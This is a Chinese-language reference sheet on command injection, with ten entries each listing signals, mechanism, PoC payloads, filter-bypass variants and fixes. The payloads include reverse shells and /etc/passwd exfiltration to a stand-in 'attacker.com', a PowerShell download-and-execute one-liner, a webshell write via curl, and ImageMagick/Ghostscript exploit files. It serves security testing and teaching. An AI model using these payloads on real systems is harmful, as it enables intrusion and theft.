# Command Injection & OS Execution Techniques

> 来源：PortSwigger Web Security Academy / OWASP / HackTricks / PayloadsAllTheThings

---

### [KB-CMD-001] Direct Command Injection (; | & || &&)
- **类别**: Command Injection
- **信号**: 输入拼接进系统命令执行，回显命令输出、错误信息或执行副作用
- **原理**: 应用将用户输入拼接到系统命令字符串中，未经消毒即调用 `system()`/`exec()`/`popen()` 等函数，攻击者通过 shell 元字符（`;`, `|`, `&`, `||`, `&&`）注入额外命令
- **最小PoC**: 
  - `127.0.0.1; whoami`
  - `127.0.0.1 | whoami`
  - `127.0.0.1 & whoami`
  - `127.0.0.1 || whoami`
  - `127.0.0.1 && whoami`
- **绕过与变体**: 管道替换分号 (`|` 替代 `;`)；逻辑运算符链 (`||`,`&&`)；命令替换 (`$()` / backticks)
- **修复**: 避免将用户输入拼接进 shell 命令；使用参数化 API（如 `subprocess.run([cmd, arg])`）；白名单验证输入；最小权限运行
- **参考**: CWE-78, PortSwigger "OS command injection, simple case"

---

### [KB-CMD-002] Blind Command Injection — Time Delay
- **类别**: Command Injection (Blind)
- **信号**: 无直接回显，但注入 `sleep`/`ping -n` 后响应时间明显增加（通常 > 注入的秒数）
- **原理**: 目标应用不返回命令输出，但攻击者可通过带外信道推断执行结果——时间延迟是最简单的盲注信号：注入 `sleep 10`，若响应延迟 ≥10s 则确认注入点存在
- **最小PoC**: 
  - Linux: `127.0.0.1; sleep 10`
  - Linux: `127.0.0.1 & sleep 10 #`
  - Windows: `127.0.0.1 & ping -n 11 127.0.0.1 &`
  - 目标：观察响应是否延迟 ~10 秒
- **绕过与变体**: 使用 `ping -c 10 127.0.0.1` 替代 `sleep`（部分环境 sleep 被过滤）；混淆空格：`sleep${IFS}10`
- **修复**: 同 CWE-78 标准防御；输出不回显不等于安全，禁止用户输入进入 shell 解释器
- **参考**: CWE-78, PortSwigger "Blind OS command injection with time delays"

---

### [KB-CMD-003] Blind Command Injection — OOB (DNS / netcat)
- **类别**: Command Injection (Blind / OOB)
- **信号**: DNS 查询到达攻击者控制的域名/服务器（Burp Collaborator、Interactsh、自建 DNS）；或 TCP 连接回连
- **原理**: 完全不返回输出时，利用 OS 内置工具发起带外信道：DNS 解析（`nslookup`/`dig`/`ping`）向攻击者域名发起查询，或 `nc`/`curl` 回连攻击者监听端口，以此确认命令执行
- **最小PoC**:
  - DNS: `; nslookup $(whoami).attacker.com` 或 `; nslookup \`whoami\`.attacker.com`
  - DNS Windows: `& nslookup %USERNAME%.attacker.com &`
  - TCP: `; nc attacker.com 4444 -e /bin/sh`
  - HTTP: `; curl http://attacker.com/$(whoami)`
  - 目标：在 Collaborator/Interactsh 或监听端口中看到请求到达
- **绕过与变体**: 用 `dig` 替代 `nslookup`；用 `wget` 替代 `curl`；用 `/dev/tcp` (bash) 替代 `nc`：`; exec 3<>/dev/tcp/attacker.com/4444; echo $(whoami) >&3`
- **修复**: 出口防火墙限制 DNS 和 TCP 出站到最小必要集合；应用层：不拼接用户输入到 OS 命令
- **参考**: CWE-78, PortSwigger "Blind OS command injection with out-of-band interaction", PortSwigger "Blind OS command injection with out-of-band data exfiltration"

---

### [KB-CMD-004] Command Injection via $() and Backticks
- **类别**: Command Injection (Command Substitution)
- **信号**: 输入点被包裹在引号或非命令上下文中，但 `$()` 或 backticks 能突破上下文执行命令
- **原理**: Shell 在两个层级执行替换——先解析 `$()` 和 `` ` `` 执行子命令，再将结果展开到外层命令。即使输入被拼接为命令参数而非新命令，子命令替换仍会触发执行
- **最小PoC**:
  - `$(whoami)`
  - `` `whoami` ``
  - `$(sleep 10)`  # Blind 场景
  - `` `nslookup $(whoami).attacker.com` ``  # OOB 场景
  - 嵌入参数场景：`file=$(whoami).txt` → 命令变成 `cat $(whoami).txt`
- **绕过与变体**: 嵌套：`$( ($(id)) )`；组合管道：`$(cat /etc/passwd | nc attacker.com 4444)`
- **修复**: 即使输入不在命令开头也不可信任；禁止 shell 解释器解析输入（用 execve 类 API 直接执行二进制）
- **参考**: CWE-78, HackTricks "Command Injection", PayloadsAllTheThings "Command Injection"

---

### [KB-CMD-005] Command Injection via Newline / CRLF
- **类别**: Command Injection (Newline Injection)
- **信号**: 输入点位于协议头、邮件头、日志行或配置文件等换行敏感上下文中，注入 `\n` 或 `\r\n` 后产生额外命令/记录/行为
- **原理**: 某些应用在将用户输入传递给命令行工具或协议解释器时未过滤换行符，攻击者利用换行符注入新命令行或新协议操作。典型场景：SMTP header 注入转命令、cron job 注入、日志行注入到 `mail`/`sendmail` 管道
- **最小PoC**:
  - `foo\nwhoami`  # 输入含换行，下一行被当作新命令
  - `email=user@example.com%0D%0AContent-Length:%200%0D%0A%0D%0A%0D%0A`  # SMTP CRLF
  - `file=report.pdf\n; nc attacker.com 4444 -e /bin/sh\n`  # 多行注入
- **绕过与变体**: `%0A` (LF), `%0D%0A` (CRLF), `\r\n`；结合命令分隔符：`\n; id\n`
- **修复**: 过滤/拒绝输入中的 `\r`、`\n` 及 URL 编码等价物；不在解释器边界的命令上下文中使用换行符分隔
- **参考**: CWE-93 (CRLF Injection), OWASP WSTG-INPV-15, HackTricks "CRLF Injection"

---

### [KB-CMD-006] WAF Bypass — Encoding & IFS Manipulation
- **类别**: Command Injection (WAF/Filter Evasion)
- **信号**: 直送命令被 WAF 拦截（403/block），但混淆后请求通过且产生预期副作用
- **原理**: WAF 基于字符串匹配拦截命令关键字和元字符。攻击者利用 shell 的灵活性——IFS (Internal Field Separator) 替代空格、十六进制/八进制编码、变量拼接、通配符——构造语义等价但签名不匹配的 payload
- **最小PoC**:
  - 空格绕过：`cat${IFS}/etc/passwd`、`cat$IFS$9/etc/passwd`、`{cat,/etc/passwd}`
  - 斜杠绕过：`cat ${HOME:0:1}etc${HOME:0:1}passwd`
  - 编码绕过：`echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh`
  - 通配符：`cat /???/???????` (代替 `/etc/passwd`)
  - 十六进制：`$'\x77\x68\x6f\x61\x6d\x69'` = `whoami`
  - 变量拼接：`a=wh;b=oa;c=mi;$a$b$c`
- **绕过与变体**: 组合多种技巧：`$(cat$IFS${HOME:0:1}etc${HOME:0:1}passwd)`；利用环境变量 `$PATH`/`$HOME` 分割；大小写混淆（Windows: `WhOaMi`）
- **修复**: 不应依赖 WAF 签名作为唯一防线；根本方案是避免 shell 解释用户输入（参数化 API）
- **参考**: HackTricks "Bypass Linux shells / WAF", PayloadsAllTheThings "Command Injection — Filter Bypasses"

---

### [KB-CMD-007] Command Injection in Filename Parameters
- **类别**: Command Injection (Filename Context)
- **信号**: 应用接受文件名参数（上传、导出、归档、转换），文件名中的 shell 元字符被执行
- **原理**: 文件操作命令（`zip`, `tar`, `convert`, `cp`, `mv`, `grep`, `find`）接受用户提供的文件名作为参数，若文件名未消毒且通过 shell 传递，攻击者可注入命令。典型场景：`zip report.zip $FILENAME` 时文件名含 `$(id).pdf`
- **最小PoC**:
  - 文件名: `$(id).pdf`  →  `convert "$(id).pdf" out.png`
  - 文件名: ``; nc attacker.com 4444 -e /bin/sh;.txt``
  - 文件名: `--help; id`  → 利用 GNU 参数解析：`cp "--help; id" /tmp/`
  - tar/zip 路径遍历 + 命令注入：`tar -cvf archive.tar $(ls)` → 文件名 `; id;`
- **绕过与变体**: 文件名编码（URL encode → shell decode）；路径中的命令替换：`/tmp/$(whoami)/file`
- **修复**: 用白名单（`[a-zA-Z0-9_.-]+`）验证文件名；不要将文件名拼接到 shell 字符串；用编程语言的文件 API 而非 shell 命令操作文件
- **参考**: CWE-78, HackTricks "File Upload — Filename Command Injection", OWASP File Upload Cheat Sheet

---

### [KB-CMD-008] Windows Command Injection (PowerShell / cmd.exe)
- **类别**: Command Injection (Windows)
- **信号**: Windows 目标上，管道符 `|`、`&`、`&&` 和 PowerShell 内联执行输出与 Linux 对应手法不同但信号一致
- **原理**: Windows 的 `cmd.exe` 和 PowerShell 各自有不同的元字符和注入语法。`cmd.exe` 使用 `&` 串联命令，PowerShell 通过 `|` 管道、`$( )` 子表达式、`Invoke-Expression` 执行。PowerShell 特有的编码（Base64 `-EncodedCommand`）常用于绕过
- **最小PoC**:
  - cmd: `127.0.0.1 & whoami`
  - cmd: `127.0.0.1 && dir C:\`
  - cmd: `127.0.0.1 | dir`
  - cmd (pipe 相当于 Linux 分号): `127.0.0.1 | whoami`
  - PowerShell Base64: `powershell -EncodedCommand dwBoAG8AYQBtAGkA`
  - PowerShell IEX: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/p.ps1')"`
- **绕过与变体**: 大小写：`PoWeRsHeLl`；缩写：`powershell -c ...`；调用运算符 `&`：`& {whoami}`；WMI: `wmic process call create "cmd.exe /c whoami"`
- **修复**: 输入消毒覆盖 `& | ; $ ( ) { } \` < > ` | ' "；禁止用户输入进入 PowerShell -Command 或 cmd /c；Windows 上考虑使用 `CreateProcess` API 直接调用二进制，绕过 shell
- **参考**: CWE-78, HackTricks "CMD Injection", PayloadsAllTheThings "Command Injection — Windows"

---

### [KB-CMD-009] Argument Injection (curl / wget / ffmpeg / git)
- **类别**: Command Injection (Argument Injection)
- **信号**: 应用调用 `curl $URL` 或 `git clone $REPO` 等，攻击者注入额外参数以改变工具行为——泄露文件、回连攻击者、写入 webshell
- **原理**: 当用户输入作为命令行工具的*参数*而非独立命令时，攻击者注入工具自身的选项来达成命令执行效果。典型：`curl` 的 `-o`/`--output` 写文件, `-F` 上传；`git` 的 `--config` 或 `-c` 注入；`wget` 的 `--post-file` 泄露文件
- **最小PoC**:
  - curl 写 shell: `http://attacker.com/shell.sh -o /var/www/html/shell.php`
  - curl 外泄文件: `http://attacker.com/ -F file=@/etc/passwd`
  - wget 外泄: `http://attacker.com/ --post-file=/etc/passwd`
  - git clone RCE: `https://github.com/user/repo.git --config core.sshCommand="id"`
  - ffmpeg SSRF/读文件: `-i http://attacker.com/$(cat /etc/passwd)`
  - mysql/mysqldump: `-u root -e "SELECT LOAD_FILE('/etc/passwd')"`
- **绕过与变体**: `-d @/etc/passwd` (curl)；`--output-document=` (wget)；`--upload-file` (curl)；`-T` (curl)
- **修复**: 用户可控的 URL/路径在使用前加 `--` 参数分隔符（告知工具后续不再解析选项）；尽可能使用编程语言的 HTTP/文件库代替 shell 调用 curl/wget
- **参考**: CWE-88 (Argument Injection), HackTricks "Argument Injection", OWASP WSTG-INPV-12

---

### [KB-CMD-010] Ghostscript / ImageMagick Command Injection
- **类别**: Command Injection (File Processing)
- **信号**: 上传或处理 PostScript/EPS/PDF/SVG/图像文件后，服务器端组件（Ghostscript/ImageMagick）执行了嵌入在文件中的指令
- **原理**: Ghostscript (gs) 的 PostScript 语言内置 `%pipe%` 操作符可执行系统命令；ImageMagick 的委托协议（delegate）`|` 管道、MSL/MVG 格式的 `read` 标签、以及 SVG 中的 `<?xpacket` 均可触发命令执行。攻击者将恶意 payload 嵌入载体文件，服务器处理时触发
- **最小PoC**:
  - ImageMagick (ImageTragick CVE-2016-3714) — `exploit.mvg`:
    ```
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://attacker.com/image.jpg"|nc attacker.com 4444 -e /bin/sh")'
    pop graphic-context
    ```
  - Ghostscript `%pipe%` — `exploit.eps`:
    ```
    %!PS
    (%pipe%nc attacker.com 4444 -e /bin/sh) (w) file /DummyFile defineresource
    ```
  - SVG + ImageMagick:
    ```svg
    <svg xmlns="http://www.w3.org/2000/svg">
    <image href="http://attacker.com/;$(nc attacker.com 4444 -e /bin/sh)" />
    </svg>
    ```
  - Ghostscript CVE-2018-19475 / CVE-2019-6116: 沙箱逃逸命令执行
- **绕过与变体**: 策略文件禁用 `%pipe%`（但存在沙箱逃逸绕过）；ImageMagick 的 `@` 间接读取；XLST/XML 注入触发 `xinclude`
- **修复**: 
  - Ghostscript: 使用 `-dSAFER` 沙箱模式 + `-dNOBIND` 防止 Operator 绑定重定义（仍需关注 CVE 沙箱逃逸）；升级到无已知 CVE 版本
  - ImageMagick: 配置 `policy.xml` 禁用危险解码器（`MVG`, `MSL`, `EPHEMERAL`, `URL`, `HTTPS`）；禁用间接读取（`@` 前缀）
  - 通用：在沙箱/容器中处理不可信文件；使用 `libvips` 等无脚本能力的替代库
- **参考**: CVE-2016-3714 (ImageTragick), CVE-2018-19475, CVE-2019-6116; CWE-78; HackTricks "Ghostscript / ImageMagick exploitation"

---

## 快速参考矩阵

| ID | 注入类型 | 关键信号 | 最小检测 |
|----|---------|---------|---------|
| KB-CMD-001 | 直接命令注入 | 回显命令输出 | `; whoami` |
| KB-CMD-002 | Blind — 时间延迟 | 响应延迟 ≥ 注入秒数 | `; sleep 10` |
| KB-CMD-003 | Blind — OOB | DNS/TCP 回连命中 | `; nslookup xxx.attacker.com` |
| KB-CMD-004 | 命令替换 | `$()` 在参数中执行 | `$(whoami)` |
| KB-CMD-005 | 换行注入 | 换行后命令执行 | `\nid` |
| KB-CMD-006 | WAF/Filters 绕过 | 直送拦截但混淆后通过 | `cat${IFS}/etc/passwd` |
| KB-CMD-007 | 文件名注入 | 文件名被 shell 解析 | `$(id).pdf` |
| KB-CMD-008 | Windows 注入 | `& whoami` 或 PowerShell Base64 | `& whoami` |
| KB-CMD-009 | 参数注入 | curl/wget 选项滥用 | `-o /var/www/shell.php` |
| KB-CMD-010 | 文件处理注入 | 上传图像/PDF 触发 Ghostscript/ImageMagick | ImageTragick .mvg |
